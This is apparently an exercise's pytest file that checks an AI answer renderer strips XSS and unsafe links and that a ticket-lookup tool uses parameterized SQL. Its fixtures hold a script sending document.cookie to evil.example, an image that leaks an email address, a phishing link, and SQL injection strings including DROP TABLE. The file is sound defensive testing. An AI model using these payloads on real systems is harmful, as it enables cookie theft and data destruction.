"""Exercise 7: secure output handling: HTML rendering and a parameterized SQL tool."""

import re
import sqlite3
from html.parser import HTMLParser

import pytest

import mine
from guardkit.render import DB_PATH


class Tags(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tags = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


def parse(fragment):
    p = Tags()
    p.feed(fragment)
    return p.tags


EVIL = """Here is your answer.
<script>fetch('https://evil.example/?c='+document.cookie)</script>
<img src=x onerror="alert(1)">
<a href="javascript:alert(2)">click</a>
<iframe src="https://evil.example"></iframe>
![status](https://stats.evil.example/p.png?d=dana%40acme.example)
[verify](https://acme.example.evil.test/verify)
Policy: [refund policy](https://wiki.acme.example/refunds) and https://acme.example/help."""


def test_no_live_tags_from_the_model():
    out = mine.render_answer_html(EVIL)
    tags = parse(out)
    names = {t for t, _ in tags}
    assert names <= {"a", "br"}, names
    assert "<script" not in out.lower() and "<iframe" not in out.lower() and "<img" not in out.lower()
    for t, attrs in tags:
        assert not any(k.startswith("on") for k in attrs)


def test_only_allowed_https_links_are_clickable():
    tags = parse(mine.render_answer_html(EVIL))
    hrefs = [attrs.get("href") for t, attrs in tags if t == "a"]
    assert "https://wiki.acme.example/refunds" in hrefs
    assert "https://acme.example/help" in hrefs
    assert all(re.match(r"^https://([\w-]+\.)*acme\.example(/|$)", h) for h in hrefs), hrefs
    for t, attrs in tags:
        if t == "a":
            assert set(attrs.get("rel", "").split()) >= {"noopener", "noreferrer", "nofollow"}


def test_images_are_replaced_by_text():
    out = mine.render_answer_html("Look: ![s](https://stats.evil.example/p.png?d=1)")
    assert "[image removed: stats.evil.example]" in out
    assert "<img" not in out


def test_text_is_preserved_and_escaped():
    out = mine.render_answer_html("5 < 7 & \"quotes\"\nnew line")
    assert "5 &lt; 7 &amp;" in out
    assert "<br>" in out
    assert "new line" in out


def test_unknown_link_keeps_label_as_text():
    out = mine.render_answer_html("[verify your account](https://acme.example.evil.test/verify)")
    assert "verify your account" in out
    assert "href" not in out


def test_http_and_javascript_links_are_not_linked():
    out = mine.render_answer_html("[a](http://acme.example/x) [b](javascript:alert(1))")
    assert "href" not in out


# ------------------------------------------------------------------ SQL
@pytest.fixture
def con():
    c = sqlite3.connect(f"file:{DB_PATH}?mode=ro", uri=True)
    yield c
    c.close()


def test_finds_one_customers_tickets(con):
    rows = mine.find_customer_tickets(con, "Pine Systems")
    assert len(rows) == 5
    assert {r["customer"] for r in rows} == {"Pine Systems"}
    assert set(rows[0]) == {"id", "customer", "subject", "priority", "status"}
    assert [r["id"] for r in rows] == sorted(r["id"] for r in rows)


def test_strips_whitespace(con):
    assert len(mine.find_customer_tickets(con, "  Pine Systems ")) == 5


@pytest.mark.parametrize("payload", [
    "x' OR '1'='1",
    "Pine Systems' OR 1=1 --",
    "'; DROP TABLE tickets; --",
    "Pine Systems\" OR \"1\"=\"1",
])
def test_injection_payloads_match_nothing(con, payload):
    assert mine.find_customer_tickets(con, payload) == []


def test_limit_is_clamped(con):
    assert len(mine.find_customer_tickets(con, "Pine Systems", limit=2)) == 2
    assert len(mine.find_customer_tickets(con, "Pine Systems", limit=0)) == 1
    assert len(mine.find_customer_tickets(con, "Pine Systems", limit=10_000)) == 5


@pytest.mark.parametrize("bad", ["", "   ", None, 42, "x" * 101])
def test_bad_names_raise(con, bad):
    with pytest.raises(ValueError):
        mine.find_customer_tickets(con, bad)


def test_uses_parameters_not_formatting(con):
    seen = []
    con.set_trace_callback(seen.append)
    mine.find_customer_tickets(con, "Pine Systems")
    con.set_trace_callback(None)
    assert seen, "no SQL was executed"
    # sqlite's trace shows bound values expanded, so check the statement the code built instead:
    import inspect
    src = inspect.getsource(mine.find_customer_tickets)
    assert "?" in src, "use ? placeholders"
    assert not re.search(r"f[\"'].*(SELECT|WHERE)", src, re.I | re.S), "no f-string SQL"
